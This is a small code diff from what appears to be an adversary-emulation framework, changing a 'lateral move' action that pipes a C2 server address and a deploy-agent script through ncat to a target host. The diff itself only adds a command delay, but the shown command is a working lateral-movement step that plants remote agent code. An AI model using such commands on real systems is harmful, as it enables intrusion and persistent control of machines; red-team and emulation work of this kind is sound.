@@ -13,4 +13,4 @@ class NCLateralMove(LowLevelAction):
         command = f'{{ echo "server={settings.c2_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} #{port}'
         payloads = ["runDeployAgent.sh"]
 
-        super().__init__(agent, command, payloads=payloads)
+        super().__init__(agent, command, payloads=payloads, command_delay=3)
